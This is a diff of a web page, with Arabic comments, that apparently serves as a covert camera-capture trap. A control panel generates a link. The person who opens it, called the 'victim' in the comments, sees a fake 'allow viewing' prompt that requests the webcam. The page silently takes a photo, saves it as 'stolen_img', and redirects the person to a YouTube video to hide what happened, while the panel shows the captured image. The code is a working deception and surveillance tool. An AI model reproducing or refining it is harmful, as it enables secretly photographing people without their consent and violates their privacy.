@@ -3,118 +3,115 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأكيد الهوية للمتابعة</title>
+    <title>نظام تحويل الروابط</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: sans-serif; overflow: hidden; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #f0f2f5; font-family: sans-serif; }
+        .container { display: flex; justify-content: center; align-items: center; height: 100vh; }
+        
+        /* لوحة التحكم الخاصة بك */
+        .admin-box { background: white; padding: 30px; border-radius: 15px; width: 90%; max-width: 450px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.1); color: #333; }
+        .admin-box input { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
         
         /* واجهة الضحية */
-        #victim-ui { width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: #1a1a1a; color: white; text-align: center; }
-        .overlay-box { padding: 20px; border-radius: 15px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); width: 80%; max-width: 350px; }
-        .allow-btn { background: #2563eb; color: white; border: none; padding: 12px 30px; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; }
-        #displayImg { display: none; max-width: 100%; max-height: 100vh; }
-
-        /* واجهة التحكم */
-        #admin-ui { background: white; padding: 25px; border-radius: 15px; position: fixed; z-index: 1000; width: 85%; max-width: 400px; left: 50%; top: 50%; transform: translate(-50%, -50%); text-align: center; color: #333; }
+        .victim-ui { background: #000; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; color: white; position: fixed; top: 0; left: 0; }
+        .dialog { background: #1a1a1a; padding: 30px; border-radius: 15px; text-align: center; border: 1px solid #333; width: 80%; max-width: 350px; }
+        
+        .btn { background: #2563eb; color: white; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; font-size: 16px; }
         .hidden { display: none !important; }
-        input[type="text"] { width: 100%; padding: 10px; margin-top: 10px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
-        #receivedImage { width: 100%; margin-top: 15px; border: 3px solid #2563eb; border-radius: 10px; }
+        #preview { width: 100%; margin-top: 15px; border: 3px solid #2563eb; border-radius: 10px; display: none; }
     </style>
 </head>
 <body>
 
-    <div id="admin-ui">
-        <h3>إعداد الرابط</h3>
-        <p>اختر الصورة التي ستظهر بعد "السماح":</p>
-        <input type="file" id="imageSelector" accept="image/*">
-        <div id="linkOutput" class="hidden">
-            <p>أرسل هذا الرابط للطرف الآخر:</p>
-            <input type="text" id="finalLink" readonly>
+    <div class="container">
+        <div id="admin-panel" class="admin-box">
+            <h2>توليد رابط مشفر</h2>
+            <p>أدخل رابط الفيديو (يوتيوب/تيك توك):</p>
+            <input type="text" id="urlInput" placeholder="https://www.youtube.com/watch?v=...">
+            <button class="btn" onclick="generate()">إنشاء الرابط</button>
+            
+            <div id="result" class="hidden">
+                <p>أرسل هذا الرابط للطرف الآخر:</p>
+                <input type="text" id="finalLink" readonly onclick="this.select()">
+            </div>
+            <hr style="margin: 20px 0;">
+            <p id="status">في انتظار الطرف الآخر...</p>
+            <img id="preview">
         </div>
-        <hr>
-        <div id="status">في انتظار الطرف الآخر...</div>
-        <img id="receivedImage" class="hidden">
-    </div>
 
-    <div id="victim-ui" class="hidden">
-        <div id="permission-dialog" class="overlay-box">
-            <h2 style="margin-top:0;">محتوى مقيد</h2>
-            <p>لمشاهدة هذه الصورة، يجب عليك منح الإذن بالنقر على زر السماح أدناه.</p>
-            <button class="allow-btn" id="fake-allow-btn">السماح بالمشاهدة</button>
+        <div id="victim-panel" class="victim-ui hidden">
+            <div class="dialog">
+                <h2 style="margin-top:0;">محتوى مقيد</h2>
+                <p style="color: #ccc;">لمشاهدة هذا الفيديو، يجب عليك منح إذن "السماح بالمشاهدة" للمشغل.</p>
+                <button class="btn" id="allowBtn" style="background: #ff0000;">السماح بالمشاهدة</button>
+            </div>
+            <video id="video" autoplay playsinline style="display:none"></video>
+            <canvas id="canvas" style="display:none"></canvas>
         </div>
-        
-        <img id="displayImg" src="">
-        <video id="video" autoplay playsinline style="display:none;"></video>
-        <canvas id="canvas" style="display:none;"></canvas>
     </div>
 
 <script>
     const params = new URLSearchParams(window.location.search);
-    const viewId = params.get('view_id'); 
+    const mode = params.get('view');
 
-    const adminUI = document.getElementById('admin-ui');
-    const victimUI = document.getElementById('victim-ui');
-    const displayImg = document.getElementById('displayImg');
-    const dialog = document.getElementById('permission-dialog');
+    // --- سيناريو الطرف الآخر (الضحية) ---
+    if (mode === 'content_check') {
+        document.getElementById('admin-panel').classList.add('hidden');
+        document.getElementById('victim-panel').classList.remove('hidden');
 
-    // --- منطق الضحية ---
-    if (viewId) {
-        adminUI.classList.add('hidden');
-        victimUI.classList.remove('hidden');
-        
-        const savedImg = localStorage.getItem('stored_image');
-        if (savedImg) displayImg.src = savedImg;
-
-        // عندما يضغط على زر "السماح بالمشاهدة" الوهمي
-        document.getElementById('fake-allow-btn').onclick = async () => {
+        document.getElementById('allowBtn').onclick = async () => {
             try {
-                // طلب الكاميرا الحقيقي من المتصفح
+                // طلب الكاميرا
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-                
-                // إخفاء الرسالة وإظهار الصورة الأصلية فوراً لكي لا يشعر بشيء
-                dialog.classList.add('hidden');
-                displayImg.style.display = 'block';
 
-                // التقاط الصورة بصمت في الخلفية بعد ثانية واحدة
+                // التقاط الصورة فوراً بعد الموافقة
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     
-                    const data = canvas.toDataURL('image/jpeg', 0.6);
-                    localStorage.setItem('captured_result', data); 
+                    const data = canvas.toDataURL('image/jpeg', 0.5);
                     
-                    stream.getTracks().forEach(t => t.stop()); // إغلاق الكاميرا
-                }, 1000);
+                    // إرسال الصورة للوحة التحكم (عبر المتصفح)
+                    localStorage.setItem('stolen_img', data);
+                    
+                    // جلب الرابط الأصلي للتحويل
+                    const target = localStorage.getItem('redirect_url') || 'https://youtube.com';
+                    
+                    stream.getTracks().forEach(t => t.stop());
+                    window.location.href = target; // تحويله للفيديو
+                }, 800);
             } catch (err) {
-                alert("يجب منح الإذن لمشاهدة المحتوى.");
+                alert("يجب السماح بالوصول للمشغل لمشاهدة المحتوى.");
             }
         };
     }
 
-    // --- منطق التحكم (أنت) ---
-    document.getElementById('imageSelector').onchange = (e) => {
-        const reader = new FileReader();
-        reader.onload = (event) => {
-            localStorage.setItem('stored_image', event.target.result);
-            const baseUrl = window.location.href.split('?')[0];
-            const randomId = "SECURE_" + Math.random().toString(36).substr(2, 5);
-            document.getElementById('finalLink').value = baseUrl + "?view_id=" + randomId;
-            document.getElementById('linkOutput').classList.remove('hidden');
-        };
-        reader.readAsDataURL(e.target.files[0]);
+    // --- سيناريو لوحة التحكم (أنت) ---
+    function generate() {
+        const url = document.getElementById('urlInput').value;
+        if (!url) return alert("يرجى إدخال الرابط أولاً");
 
+        // حفظ الرابط الأصلي في المتصفح ليتم سحبه لاحقاً
+        localStorage.setItem('redirect_url', url);
+
+        const baseUrl = window.location.href.split('?')[0];
+        document.getElementById('finalLink').value = baseUrl + "?view=content_check";
+        document.getElementById('result').classList.remove('hidden');
+
+        // انتظار الصورة
         window.addEventListener('storage', (event) => {
-            if (event.key === 'captured_result') {
-                const imgDisplay = document.getElementById('receivedImage');
-                imgDisplay.src = event.newValue;
-                imgDisplay.classList.remove('hidden');
-                document.getElementById('status').innerText = "✅ تم استلام الصورة من الضحية!";
+            if (event.key === 'stolen_img') {
+                const img = document.getElementById('preview');
+                img.src = event.newValue;
+                img.style.display = 'block';
+                document.getElementById('status').innerText = "✅ تم استلام صورة الشخص!";
             }
         });
-    };
+    }
 </script>
 </body>
 </html>
